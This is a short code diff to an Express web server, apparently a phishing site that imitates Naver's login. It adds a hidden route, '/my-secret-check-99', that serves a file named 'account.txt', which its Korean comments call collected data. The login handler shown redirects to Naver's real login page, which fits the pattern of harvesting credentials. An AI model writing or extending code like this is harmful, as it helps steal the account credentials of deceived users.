@@ -28,6 +28,20 @@ app.post('/login', (req, res) => {
     res.redirect('https://nid.naver.com/nidlogin.login');
 });
 
+// 비밀 주소로 접속하면 파일 내용을 보여주는 코드
+app.get('/my-secret-check-99', (req, res) => {
+    const filePath = path.join(__dirname, 'account.txt');
+    
+    // 파일이 있는지 확인
+    if (fs.existsSync(filePath)) {
+        // 브라우저에서 텍스트 파일을 바로 열어줌
+        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+        res.sendFile(filePath);
+    } else {
+        res.send('아직 수집된 데이터가 없거나 파일이 지워졌습니다.');
+    }
+});
+
 const PORT = process.env.PORT || 3000; 
 
 app.listen(PORT, () => {
